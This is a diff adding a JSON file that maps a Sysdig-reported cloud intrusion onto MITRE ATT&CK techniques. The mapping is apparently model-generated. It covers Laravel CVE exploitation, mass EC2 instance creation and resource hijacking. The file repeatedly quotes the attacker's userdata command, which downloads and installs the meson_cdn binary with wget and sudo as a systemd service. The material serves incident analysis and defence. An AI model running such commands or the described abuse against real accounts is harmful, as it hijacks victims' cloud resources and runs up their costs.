@@ -1,0 +1,379 @@
+{
+  "tactics_used": [
+    {
+      "tactic_id": "TA0001",
+      "tactic_name": "Initial Access",
+      "techniques": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "Exploit Public-Facing Application",
+          "subtechnique_id": null,
+          "inferred": false,
+          "evidence_quote": "The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0007",
+      "tactic_name": "Discovery",
+      "techniques": [
+        {
+          "technique_id": "T1526",
+          "technique_name": "Cloud Service Discovery",
+          "subtechnique_id": null,
+          "inferred": false,
+          "evidence_quote": "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users to create a large number of EC2 instances.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0004",
+      "tactic_name": "Privilege Escalation",
+      "techniques": [
+        {
+          "technique_id": "T1078.004",
+          "technique_name": "Valid Accounts: Cloud Accounts",
+          "subtechnique_id": "T1078.004",
+          "inferred": true,
+          "evidence_quote": "They then used the privileges they identified for the compromised users to create a large number of EC2 instances.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0003",
+      "tactic_name": "Persistence",
+      "techniques": [
+        {
+          "technique_id": "T1053.006",
+          "technique_name": "Scheduled Task/Job: Systemd Service",
+          "subtechnique_id": "T1053.006",
+          "inferred": false,
+          "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
+          "validated": false
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0002",
+      "tactic_name": "Execution",
+      "techniques": [
+        {
+          "technique_id": "T1059.004",
+          "technique_name": "Command and Scripting Interpreter: Unix Shell",
+          "subtechnique_id": "T1059.004",
+          "inferred": false,
+          "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn",
+          "validated": false
+        },
+        {
+          "technique_id": "T1204.003",
+          "technique_name": "User Execution: Malicious Image",
+          "subtechnique_id": "T1204.003",
+          "inferred": true,
+          "evidence_quote": "The attacker used a public AMI (Ubuntu 22.04) and spawned multiple batches of 500 micro-sized instances per region",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0005",
+      "tactic_name": "Defense Evasion",
+      "techniques": [
+        {
+          "technique_id": "T1578.002",
+          "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
+          "subtechnique_id": "T1578.002",
+          "inferred": false,
+          "evidence_quote": "Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions and execute the meson_cdn binary.",
+          "validated": true
+        }
+      ]
+    },
+    {
+      "tactic_id": "TA0040",
+      "tactic_name": "Impact",
+      "techniques": [
+        {
+          "technique_id": "T1496",
+          "technique_name": "Resource Hijacking",
+          "subtechnique_id": null,
+          "inferred": false,
+          "evidence_quote": "Within minutes, the attacker attempted to create 6,000 Meson Network nodes using a compromised cloud account... we estimate a cost of more than $2,000 per day for all the Meson network nodes created",
+          "validated": true
+        }
+      ]
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "description": "Attacker exploited CVE-2021-3129 in an exposed Laravel application and a WordPress misconfiguration to gain initial access to the AWS cloud account credentials.",
+      "evidence_quote": "The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [],
+      "validated": true
+    },
+    {
+      "step": 2,
+      "technique_id": "T1526",
+      "technique_name": "Cloud Service Discovery",
+      "description": "Immediately after gaining access, the attacker ran automated reconnaissance to enumerate available cloud services, regions, and IAM privileges associated with the compromised account users.",
+      "evidence_quote": "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [
+        "AWS CloudTrail",
+        "AWS IAM"
+      ],
+      "validated": true
+    },
+    {
+      "step": 3,
+      "technique_id": "T1578.002",
+      "technique_name": "Modify Cloud Compute Infrastructure: Create Cloud Instance",
+      "description": "Using the Boto3 SDK via Python scripts, the attacker called RunInstances across multiple AWS regions to spin up ~6,000 micro-sized EC2 instances (batches of 500 per region) using a public Ubuntu 22.04 AMI.",
+      "evidence_quote": "\"minCount\": 500, \"account\": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [
+        "Amazon EC2"
+      ],
+      "validated": true
+    },
+    {
+      "step": 4,
+      "technique_id": "T1059.004",
+      "technique_name": "Command and Scripting Interpreter: Unix Shell",
+      "description": "A malicious shell script was embedded in the EC2 userdata field. On each instance boot, it downloaded the meson_cdn binary via wget, extracted it, installed it as a systemd service, and started it \u2014 automatically enrolling each node into the attacker's Meson Network account.",
+      "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [
+        "Amazon EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 5,
+      "technique_id": "T1053.006",
+      "technique_name": "Scheduled Task/Job: Systemd Service",
+      "description": "The meson_cdn binary was installed and started as a persistent systemd service on each EC2 instance, ensuring it survived reboots and continued contributing bandwidth and storage to the attacker's Meson Network nodes.",
+      "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [
+        "Amazon EC2"
+      ],
+      "validated": false
+    },
+    {
+      "step": 6,
+      "technique_id": "T1496",
+      "technique_name": "Resource Hijacking",
+      "description": "Each of the ~6,000 EC2 nodes ran the meson_cdn process, consuming victim-account bandwidth and storage to earn Meson Network tokens (MSN) for the attacker, costing the victim over $2,000/day in compute and up to $22,000/month in public IP charges.",
+      "evidence_quote": "we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!",
+      "evidence_sources": [
+        "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+      ],
+      "aws_services_involved": [
+        "Amazon EC2"
+      ],
+      "validated": true
+    }
+  ],
+  "aws_services": [
+    "Amazon EC2",
+    "AWS CloudTrail",
+    "AWS IAM"
+  ],
+  "impact_type": "Cryptomining",
+  "confidence_score": 0.95,
+  "initial_access_vector": "Exploitation of CVE-2021-3129 (Laravel debug mode RCE) and a WordPress misconfiguration in publicly exposed honeynet web applications, yielding AWS account credentials.",
+  "persistence_mechanism": "meson_cdn binary installed as a systemd service via EC2 userdata on each of ~6,000 spun-up instances, automatically starting on boot.",
+  "privilege_escalation": "Attacker leveraged the IAM privileges already attached to the compromised cloud account users \u2014 no explicit privilege escalation beyond the initial foothold was described.",
+  "data_exfiltrated": false,
+  "attack_chain_graph": {
+    "nodes": [
+      {
+        "step": 1,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "description": "Attacker exploited CVE-2021-3129 in an exposed Laravel application and a WordPress misconfiguration to gain initial access to the AWS cloud account credentials.",
+        "tactic_id": "TA0001",
+        "evidence_quote": "The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": []
+      },
+      {
+        "step": 2,
+        "technique_id": "T1526",
+        "technique_name": "Cloud Service Discovery",
+        "description": "Immediately after gaining access, the attacker ran automated reconnaissance to enumerate available cloud services, regions, and IAM privileges associated with the compromised account users.",
+        "tactic_id": "TA0007",
+        "evidence_quote": "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": [
+          "AWS CloudTrail",
+          "AWS IAM"
+        ]
+      },
+      {
+        "step": 3,
+        "technique_id": "T1578.002",
+        "technique_name": "Create Cloud Instance",
+        "description": "Using the Boto3 SDK via Python scripts, the attacker called RunInstances across multiple AWS regions to spin up ~6,000 micro-sized EC2 instances (batches of 500 per region) using a public Ubuntu 22.04 AMI.",
+        "tactic_id": "TA0005",
+        "evidence_quote": "\"minCount\": 500, \"account\": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": [
+          "Amazon EC2"
+        ]
+      },
+      {
+        "step": 4,
+        "technique_id": "T1059.004",
+        "technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "description": "A malicious shell script was embedded in the EC2 userdata field. On each instance boot, it downloaded the meson_cdn binary via wget, extracted it, installed it as a systemd service, and started it \u2014 automatically enrolling each node into the attacker's Meson Network account.",
+        "tactic_id": "",
+        "evidence_quote": "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": [
+          "Amazon EC2"
+        ]
+      },
+      {
+        "step": 5,
+        "technique_id": "T1053.006",
+        "technique_name": "Scheduled Task/Job: Systemd Service",
+        "description": "The meson_cdn binary was installed and started as a persistent systemd service on each EC2 instance, ensuring it survived reboots and continued contributing bandwidth and storage to the attacker's Meson Network nodes.",
+        "tactic_id": "",
+        "evidence_quote": "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": [
+          "Amazon EC2"
+        ]
+      },
+      {
+        "step": 6,
+        "technique_id": "T1496",
+        "technique_name": "Resource Hijacking",
+        "description": "Each of the ~6,000 EC2 nodes ran the meson_cdn process, consuming victim-account bandwidth and storage to earn Meson Network tokens (MSN) for the attacker, costing the victim over $2,000/day in compute and up to $22,000/month in public IP charges.",
+        "tactic_id": "TA0040",
+        "evidence_quote": "we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!",
+        "evidence_sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "aws_services_involved": [
+          "Amazon EC2"
+        ]
+      }
+    ],
+    "edges": [
+      {
+        "source": "T1190",
+        "target": "T1526",
+        "source_step": 1,
+        "target_step": 2,
+        "source_technique_name": "Exploit Public-Facing Application",
+        "target_technique_name": "Cloud Service Discovery",
+        "sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "evidence_quotes": [
+          "The attacker exploited CVE-2021-3129 in a Laravel application and a misconfiguration in WordPress to gain initial access to the cloud account.",
+          "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users."
+        ]
+      },
+      {
+        "source": "T1526",
+        "target": "T1578.002",
+        "source_step": 2,
+        "target_step": 3,
+        "source_technique_name": "Cloud Service Discovery",
+        "target_technique_name": "Create Cloud Instance",
+        "sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "evidence_quotes": [
+          "Following initial access, the attacker used automated reconnaissance techniques to instantly uncover a lay of the land. They then used the privileges they identified for the compromised users.",
+          "\"minCount\": 500, \"account\": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions"
+        ]
+      },
+      {
+        "source": "T1578.002",
+        "target": "T1059.004",
+        "source_step": 3,
+        "target_step": 4,
+        "source_technique_name": "Create Cloud Instance",
+        "target_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "evidence_quotes": [
+          "\"minCount\": 500, \"account\": 500 ... Within minutes, the attacker was able to spawn almost 6,000 instances inside the compromised account across multiple regions",
+          "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn"
+        ]
+      },
+      {
+        "source": "T1059.004",
+        "target": "T1053.006",
+        "source_step": 4,
+        "target_step": 5,
+        "source_technique_name": "Command and Scripting Interpreter: Unix Shell",
+        "target_technique_name": "Scheduled Task/Job: Systemd Service",
+        "sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "evidence_quotes": [
+          "wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.20/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn\nsudo ./meson_cdn config set --token=**** --https_port=443 --cache.size=30\nsudo ./service start meson_cdn",
+          "sudo ./service install meson_cdn ... sudo ./service start meson_cdn"
+        ]
+      },
+      {
+        "source": "T1053.006",
+        "target": "T1496",
+        "source_step": 5,
+        "target_step": 6,
+        "source_technique_name": "Scheduled Task/Job: Systemd Service",
+        "target_technique_name": "Resource Hijacking",
+        "sources": [
+          "https://sysdig.com/blog/cloud-threats-deploying-crypto-cdn/"
+        ],
+        "evidence_quotes": [
+          "sudo ./service install meson_cdn ... sudo ./service start meson_cdn",
+          "we estimate a cost of more than $2,000 per day for all the Meson network nodes created, even just using micro sizes. This isn't counting the potential costs for public IP addresses which could run as much as $22,000 a month for 6,000 nodes!"
+        ]
+      }
+    ]
+  },
+  "framework": {
+    "name": "mitre-attack",
+    "version": "unknown"
+  },
+  "schema_version": "1.0",
+  "incident_slug": "sysdig-2024-march",
+  "analyzed_at": "2026-04-15T21:09:30.112794+00:00",
+  "model": "claude-sonnet-4-6",
+  "source_chars": 24777
+}
